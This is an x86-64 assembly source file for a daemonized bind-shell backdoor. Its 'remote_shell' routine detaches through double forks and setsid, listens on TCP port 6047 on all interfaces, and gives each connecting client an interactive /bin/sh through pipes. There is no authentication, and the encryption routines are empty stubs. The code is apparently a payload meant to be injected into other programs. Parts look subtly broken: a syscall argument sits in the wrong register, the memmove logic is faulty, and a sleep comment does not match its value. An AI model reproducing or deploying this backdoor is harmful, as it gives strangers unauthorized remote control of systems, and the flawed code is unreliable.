
struc sockaddr_in
	.family:	resw	1
	.port:		resw	1
	.addr:		resd	1
	.zero 		resb	6
endstruc

%define IS_LITTLE_ENDIAN

%define AF_INET 2
%define SOCK_STREAM 1
%define SOCK_DGRAM 2

%define PORT 6047
%define BUFFSZ 0x1000
%define STACKSZ 0x2168
%define LOCKTLS_FILENAME_0_7 "/tmp/123"
%define LOCKTLS_FILENAME_8_15 0x0
%define LOCKSHELL_FILENAME_0_7 "/tmp/987"
%define LOCKSHELL_FILENAME_8_15 0x0
%define LISTEN_BACKLOG 0x4

%define STDIN_FILENO 0x0
%define STDOUT_FILENO 0x1
%define STDERR_FILENO 0x2

%define SYS_READ 0
%define SYS_WRITE 1
%define SYS_EXIT 60
%define SYS_FORK 57
%define SYS_SETSID 112
%define SYS_OPEN 2
%define SYS_SOCKET 41
%define SYS_BIND 49
%define SYS_LISTEN 50
%define SYS_ACCEPT 43
%define SYS_DUP2 33
%define SYS_CLOSE 3
%define SYS_CHDIR 80
%define SYS_EXECVE 59
%define SYS_KILL 62
%define SYS_UNLINK 87
%define SYS_PIPE 22
%define SYS_SELECT 23
%define SYS_WAIT4 61
%define SYS_FCNTL 72
%define SYS_NANOSLEEP 35

%define F_GETFL 3
%define F_SETFL 4
%define O_NONBLOCK 0o4000

%define EAGAIN -11

%define mlock_tls_fd DWORD [rbp - 0x4]
%define mlock_shell_fd DWORD [rbp - 0x8]
%define mlock_tls_filename (rbp - 0x18)		; char[16]
%define mlock_shell_filename (rbp - 0x28)	; char[16]
%define mpid DWORD [rbp - 0x2c]
%define mend_tls DWORD [rbp - 0x30]
%define mpipesfd_in  (rbp - 0x38)			; int[2]
%define mpipesfd_out (rbp - 0x40)			; int[2]
%define mserv_fd DWORD [rbp - 0x44]
%define mserv_addr (rbp - 0x54)				; struct sockaddr_in (0x10 bytes)
%define mcli_fd DWORD [rbp - 0x58]
%define mcli_addr (rbp - 0x68)				; struct sockaddr_in (0x10 bytes)
%define mbuffcli (rbp - 0x1068)				; char[0x1000]
%define mbuffshell (rbp - 0x2068)			; char[0x1000]
%define mfdset_read (rbp - 0x20e8)			; fd_set (0x80 bytes)
%define mfdset_write (rbp - 0x2168)			; fd_set (0x80 bytes)

%define rbuffcli r12
%define rbuffcli_size r13
%define rbuffshell r14
%define rbuffshell_size r15
%define rkey rbx

section .text
global remote_shell
global _start

_start:
remote_shell: ; rdi: key (QWORD)

	push rbp
	mov rbp, rsp
	sub rsp, STACKSZ

	mov rax, LOCKTLS_FILENAME_0_7			; init the stack
	mov [mlock_tls_filename], rax
	mov rax, LOCKTLS_FILENAME_8_15
	mov [mlock_tls_filename + 0x8], rax
	mov rax, LOCKSHELL_FILENAME_0_7
	mov [mlock_shell_filename], rax
	mov rax, LOCKSHELL_FILENAME_8_15
	mov [mlock_shell_filename + 0x8], rax
	mov mend_tls, 0x0

	lea rbuffcli, [mbuffcli]				; init registers
	xor rbuffcli_size, rbuffcli_size
	lea rbuffshell, [mbuffshell]
	xor rbuffshell_size, rbuffshell_size
	mov rkey, rdi

	mov rax, SYS_FORK						; Create a deamon for the TLS server (kill the parents)
	syscall									; fork()
	cmp rax, 0x0
	js sys_exit
	jg proceed_execution
	mov rax, SYS_SETSID
	syscall									; setsid()
	cmp rax, 0x0
	js sys_exit
	mov rax, SYS_FORK
	syscall									; fork()
	test rax, rax
	jnz sys_exit

	mov rax, SYS_OPEN						; Lock the deamon (only 1 instance is allowed at the same time)
	lea rdi, [mlock_tls_filename]
	mov esi, 0o300
	mov edx, 0o666
	syscall									
	cmp rax, 0x0
	js finish_tls
	mov mlock_tls_fd, eax					; mlock_tls_fd = open(mlock_tls_filename, O_CREAT | O_EXCL, 06660)

	mov rax, SYS_SOCKET						; Create a socket for the server
	mov edi, AF_INET
	mov esi, SOCK_STREAM
	mov edx, 0x0
	syscall									
	cmp rax, 0x0
	js finish_tls
	mov mserv_fd, eax						; mserv_fd = socket(AF_INET, SOCK_STREAM, 0)

	mov WORD [mserv_addr + sockaddr_in.family], 0x2		; mserv_addr.sin_family = AF_INET
	mov di, PORT
	call htons
	mov cx, ax
	mov WORD [mserv_addr + sockaddr_in.port], ax		; mserv_addr.sin_port = htons(PORT)
	mov DWORD [mserv_addr + sockaddr_in.addr], 0x0		; mserv_addr.sin_addr.s_addr = INADDR_ANY ;
	lea rsi, [mserv_addr]
	mov edx, 0x10
.bind_loop:
	mov edi, mserv_fd						
	mov rax, SYS_BIND						; while (bind(mserv_fd, &mserv_addr, sizeof(mserv_addr)) < 0)
	syscall									; 		mserv_addr.sin_port = htons(htons(mserv_addr.sin_port) + 1)

	test rax, rax
	jz .end_bind_loop
	inc cx
	mov di, cx
	call htons
	mov cx, ax
	mov WORD [mserv_addr + sockaddr_in.port], ax
	jmp .bind_loop
.end_bind_loop:

	mov rax, SYS_LISTEN						; set up the server by listening to incomming conections
	mov edi, mserv_fd
	mov esi, LISTEN_BACKLOG
	syscall									; listen(mserv_fd, LISTEN_BACKLOG)
	cmp rax, 0x0
	js finish_tls

tls_loop:
	mov rax, SYS_ACCEPT						; block until new incomming conection
	mov edi, mserv_fd
	lea rsi, [mcli_addr]
	mov rdx, 0x10
	push rdx
	mov rdx, rsp
	syscall
	cmp rax, 0x0
	js finish_tls
	mov mcli_fd, eax						; mcli_fd = accept(mserv_fd, &mcli_addr, (socklen_t[]){sizeof(mcli_addr)})
	add rsp, 0x8

	mov rax, SYS_PIPE						; TLS -> Shell's STDIN
	lea rdi, [mpipesfd_in]
	syscall									; pipe(mpipesfd_in)
	cmp rax, 0x0
	js finish_tls
	mov rax, SYS_PIPE						; Shell's STDOUT -> TLS
	lea rdi, [mpipesfd_out]
	syscall									; pipe(mpipesfd_out)
	cmp rax, 0x0
	js finish_tls

	mov rax, SYS_FORK						; Start a new deamon creation for the shell
	syscall									; fork()
	cmp rax, 0x0
	js sys_exit
	jz shell								

	mov rax, SYS_CLOSE						; close unused duplicates
	mov edi, DWORD [mpipesfd_in]
	syscall									; close(mpipesfd_in[0])
	cmp rax, 0x0
	js finish_tls
	mov rax, SYS_CLOSE
	mov edi, DWORD [mpipesfd_out + 0x4]
	syscall									; close(mpipesfd_out[1])
	cmp rax, 0x0
	js finish_tls

	mov edi, mcli_fd						; make fds non block
	call make_non_blocking
	mov edi, DWORD [mpipesfd_in + 0x4]
	call make_non_blocking
	mov edi, DWORD [mpipesfd_out]
	call make_non_blocking

read_write_loop:

	mov rax, SYS_NANOSLEEP					; Loop each 10 ms
	mov rdi, 100000000
	push rdi 
	mov rdi, 0
	push rdi
	mov rdi, rsp
	mov rsi, 0x0
	syscall									; nanosleep({0, 100000000}, NULL)
	cmp rax, 0x0
	js finish_tls							

	test rbuffshell_size, rbuffshell_size	; if (rbuffshell_size != 0)
	jz .read_from_shell

	mov rax, SYS_WRITE						; write to the client
	mov esi, mcli_fd
	mov rsi, rbuffshell
	mov rdx, rbuffshell_size
	syscall									; write(mcli_fd, rbuffshell, rbuffshell_size)
	cmp rax, EAGAIN
	je .skip_block_wc
	cmp rax, 0x0
	js finish_tls
	jz end_conection
.skip_block_wc:
	cmp rax, rbuffshell_size
	je .cli_skip_shift_buff					; if (rax != rbuffshell_size)
	mov rdi, rbuffshell						;	memmove(rbuffshell, rbuffshell + rax, rbuffshell_size - rax)
	mov rsi, rbuffshell
	add rsi, rax
	mov rdx, rbuffshell_size
	sub rdx, rax
	push rax
	call memmove
.cli_skip_shift_buff:
	sub rbuffshell_size, [rsp]				; Update the rbuffshell_size
	add rsp, 0x8
	jmp .skip_block_rs

.read_from_shell:							; else

	mov rax, SYS_READ						; read from the shell
	mov edi, DWORD [mpipesfd_out]
	mov rsi, rbuffshell
	mov rdx, BUFFSZ
	syscall
	cmp rax, EAGAIN
	je .skip_block_rs
	cmp rax, 0x0
	js finish_tls
	mov rbuffshell_size, rax				; rbuffshell_size = read(mpipes_out[1], rbuffshell, BUFFSZ)

	mov rdi, rbuffshell						; encrypt data before send it to the client
	mov rsi, rbuffshell_size
	mov rdx, rkey
	call encrypt							; encrypt(rbuffshell, rbuffshell_size, rkey)

.skip_block_rs:

	test rbuffcli_size, rbuffcli_size		; if (rbuffcli_size != 0)
	jz .read_from_cli

	mov rax, SYS_WRITE						; write to shell
	mov edi, [mpipesfd_in + 0x4]
	mov rsi, rbuffcli
	mov rdx, rbuffcli_size
	syscall									; write(mpipesfd_in[1], rbuffcli, rbuffcli_size)
	cmp rax, EAGAIN
	je .skip_block_ws
	cmp rax, 0x0
	js finish_tls
	jz end_conection
.skip_block_ws:
	cmp rax, rbuffshell_size
	je .shell_skip_shift_buff				; if (rax != rbuffshell_size)
	mov rdi, rbuffcli						; 	memmove(rbuffcli, rbuffcli + rax, rbuffcli_size - rax)
	mov rsi, rbuffcli
	add rsi, rax
	mov rdx, rbuffcli_size
	sub rdx, rax
	push rax
	call memmove
.shell_skip_shift_buff:
	sub rbuffcli_size, [rsp]				; Update the rbuffcli_size
	add rsp, 0x8
	jmp .skip_block_rc

.read_from_cli:								; else

	mov rax, SYS_READ						; Read from the client
	mov edi, mcli_fd
	mov rsi, rbuffcli
	mov rdx, BUFFSZ
	syscall
	cmp rax, EAGAIN
	je .skip_block_rc
	cmp rax, 0x0
	js finish_shell
	mov rbuffcli_size, rax					; rbuffcli_size = read(mcli_fd, rbuffcli, BUFFSZ)

	mov rdi, rbuffcli						; decrypt the msg from the clint
	mov rsi, rbuffcli_size
	mov rdx, rkey
	call decrypt							; decrypt(rbuffcli, rbuffcli_size, rkey)

	cmp rbuffcli_size, 0x5					; exit in case client types "exit\n"
	jne .not_exit
	cmp DWORD [rbuffcli], "exit"
	jne .not_exit
	cmp BYTE [rbuffcli + 0x4], `\n`
	jne .not_exit
	mov mend_tls, 0x1
	jmp end_conection

.not_exit:
	test rbuffcli_size, rbuffcli_size		; end conection in case of EOF
	jz end_conection

.skip_block_rc:
	jmp read_write_loop

end_conection:

	mov rax, SYS_CLOSE						; close client
	mov edi, mcli_fd
	syscall									; close(mcli_fd)
	mov rax, SYS_CLOSE						; close input shell
	mov edi, DWORD [mpipesfd_in + 0x04]
	syscall									; close(mpipesfd_in[1])
	mov rax, SYS_CLOSE						; close output shell
	mov edi, DWORD [mpipesfd_out]
	syscall									; close(mpipesfd_out[0])

	mov r8d, mend_tls
	test mend_tls, r8d
	jnz .end_tls
	jmp tls_loop

.end_tls:
	mov rax, SYS_CLOSE						; Close lockfd
	mov edi, mlock_tls_fd
	syscall									; close(mlock_tls_fd)
	mov rax, SYS_UNLINK						; Remove lock
	lea rdi, [mlock_tls_filename]
	syscall									; unlink(mlock_tls_filename)

finish_tls:
	jmp sys_exit

shell:
	mov rax, SYS_SETSID						; Proceed to create a new deamon
	syscall									; setsid()
	cmp rax, 0x0
	js finish_shell
	mov rax, SYS_FORK
	syscall									; fork()
	cmp rax, 0x0
	jnz sys_exit
	mov rax, SYS_FORK						; Child: Shell ; Parent: waits for Shell and then unlocks the lock
	syscall
	cmp rax, 0x0
	js sys_exit
	mov mpid, eax
	jg shell_parent

	mov rax, SYS_OPEN						; Lock the deamon (only 1 instance is allowed at the same time)
	lea rdi, [mlock_shell_filename]
	mov esi, 0o300
	mov edx, 0o666
	syscall								
	cmp rax, 0x0
	js finish_shell
	mov mlock_shell_fd, eax					; mlock_shell_fd = open(mlock_shell_filename, O_CREAT | O_EXCL, 0666)

	mov rax, SYS_CLOSE						; Close unused duplicates
	mov edi, DWORD [mpipesfd_in + 0x4]
	syscall									; close(mpipesfd_in[1])
	cmp rax, 0x0
	js finish_shell
	mov rax, SYS_CLOSE
	mov edi, DWORD [mpipesfd_out]
	syscall									; close(mpipesfd_out[0])
	cmp rax, 0x0
	js finish_shell

	mov rax, SYS_DUP2						; Replace STDIN by TLS' piped output
	mov edi, DWORD [mpipesfd_in]
	mov esi, STDIN_FILENO
	syscall									; dup2(mpipesfd_in[0], STDIN_FILENO)
	cmp rax, 0x0
	js finish_shell
	mov rax, SYS_DUP2						; Replace STDOUT by TLS' piped input
	mov edi, DWORD [mpipesfd_out + 0x4]
	mov esi, STDOUT_FILENO
	syscall									; dup2(mpipesfd_out[1], STDOUT_FILENO)
	cmp rax, 0x0
	js finish_shell
	mov rax, SYS_DUP2						; Replace STDERR, by STDOUT
	mov edi, STDERR_FILENO
	mov esi, STDOUT_FILENO
	syscall									; dup2(STDERR_FILENO, STDOUT_FILENO)
	cmp rax, 0x0
	js finish_shell

	mov rax, SYS_CHDIR						; Switch working directory to "/"
	mov rdi, "/"
	push rdi
	mov rdi, rsp
	syscall									; chdir("/")
	cmp rax, 0x0
	js finish_shell
	add rsp, 0x8

	mov rax, SYS_EXECVE						; Execute Shell
	mov rdi, "/bin/sh"
	push rdi
	mov rdi, rsp							; rdi = "/bin/sh" address
	mov rsi, 0x0
	push rsi
	push rdi
	mov rsi, rsp							; rsi = (char*[]){rdi, 0}
	mov rdx, 0x0
	syscall									; execve("/bin/sh", (char*[]){"/bin/sh", NULL}, NULL)

	add rsp, 0x18
	jmp finish_shell

shell_parent:
	mov rax, SYS_CLOSE						; Close unused duplicates
	mov edi, DWORD [mpipesfd_in]
	syscall									; close(mpipesfd_in[0])
	mov rax, SYS_CLOSE
	mov edi, DWORD [mpipesfd_in + 0x4]
	syscall									; close(mpipesfd_in[1])
	mov rax, SYS_CLOSE
	mov edi, DWORD [mpipesfd_out]
	syscall									; close(mpipesfd_out[0])
	mov rax, SYS_CLOSE
	mov edi, DWORD [mpipesfd_out + 0x4]
	syscall									; close(mpipesfd_out[1])

	mov rax, SYS_WAIT4						; Wait for Shell to terminate
	mov edi, mpid
	mov rsi, 0x0
	mov edx, 0x0
	mov rcx, 0x0
	syscall									; wait4(mpid, NULL, 0, NULL)

finish_shell:
	mov rax, SYS_CLOSE						; Close lockfd
	mov edi, mlock_shell_fd
	syscall									; close(mlock_shell_fd)
	mov rax, SYS_UNLINK						; Remove lock
	lea rdi, [mlock_shell_filename]
	syscall									; unlink(mlock_shell_filename)
	jmp sys_exit


make_non_blocking:							; fd : edi

	mov rax, SYS_FCNTL
	mov esi, F_GETFL
	mov rdx, 0x0
	syscall
	cmp rax, 0x0
	js sys_exit
	mov rcx, rax							; rcx = fcntl(fd, F_GETFL, 0)
	mov rax, SYS_FCNTL
	mov esi, F_SETFL
	mov rdx, rcx
	or rdx, O_NONBLOCK
	syscall									; fcntl(fd, F_SETFL, rcx | O_NONBLOCK)
	cmp rax, 0x0
	js sys_exit
	ret

htons:										; swap 2 first bytes of rdi
	xor rax, rax 
%ifdef IS_LITTLE_ENDIAN
	ror di, 0x8
%endif
	mov ax, di								; TODO ifndef
	ret

%define NFDBITS 64

fd_elt:
	xor rax, rax
	xor rdx, rdx
	mov eax, edi
	mov ecx, NFDBITS
	idiv ecx
	ret

fd_mask:
	xor rax, rax
	xor rdx, rdx
	mov eax, edi
	mov ecx, NFDBITS
	cdq
	idiv ecx
	mov rax, 0x1
	xor rcx, rcx
	mov cl, dl
	shl rax, cl
	ret

fdzero:
	push rdi
	mov rcx, 0x10							; repeat rcx time
	xor rax, rax							; use rax value
	cld										; go forward
	rep stosq ;[rdi]						; set rax into [rdi++] rcx time
	pop rdi
	ret

fdset:
	call fd_elt
	push rax
	call fd_mask
	pop rcx
	or [rsi + rcx], rax
	ret

fdisset:
	call fd_elt
	push rax
	call fd_mask
	pop rcx
	and rax, [rsi + rcx]
	ret

encrypt:
	; TODO: Include
	ret

decrypt:
	; TODO: Include
	ret

memmove:	; memmove(void *dst, const void *src, size_t len)
	mov rcx, rdx
	inc rcx
	cmp rsi, rdi
	jb .memmove_src_addr_before
	je .memmove_end
	mov rcx, -1
.memmove_memcpy:							; copy begin to end
	inc rcx
	mov r8b, BYTE [rsi + rcx]
	mov BYTE [rdi + rcx], r8b
	cmp rcx, rdx
	jb .memmove_memcpy
	jmp .memmove_end
.memmove_src_addr_before:					; copy end to begin
	dec rdx
	mov r8b, BYTE [rsi, + rcx]
	mov BYTE [rdi + rcx], r8b
	test rcx, rcx
	jnz .memmove_src_addr_before
.memmove_end:
	mov rax, rdi
	ret

sys_exit:
	mov rax, SYS_EXIT
	mov rdi, 0x0
	syscall

proceed_execution:
	add rsp, STACKSZ
	pop rbp
	;ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; _start: ; just for testing
; 	mov rdi, 1234
; 	call remote_shell

; 	mov rax, 60
; 	mov rdi, 0x0
; 	syscall
